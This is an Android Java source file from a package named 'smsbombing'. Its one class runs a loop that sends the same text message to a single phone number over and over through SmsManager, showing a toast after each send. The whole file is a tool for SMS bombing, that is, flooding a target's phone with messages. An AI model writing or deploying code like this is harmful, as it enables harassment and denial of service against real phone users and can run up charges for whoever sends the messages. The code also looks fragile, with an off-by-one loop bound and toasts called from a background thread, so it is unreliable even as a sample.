package com.example.smsbombing;

import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.widget.Toast;

public class threads implements Runnable{
    Context context;
    String phone;
    int count;
    String msg;

    public threads(Context context, String phone, int count, String msg) {
        this.context = context;
        this.phone = phone;
        this.count = count;
        this.msg = msg;

    }


    @Override
    public void run() {
        int i=0;
        while (i<=count){

            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phone, null, msg, null, null);
            Toast.makeText(context, "Message send "+count+" Times "+" Message is "+msg, Toast.LENGTH_SHORT).show();
                    i++;
        }

    }
}
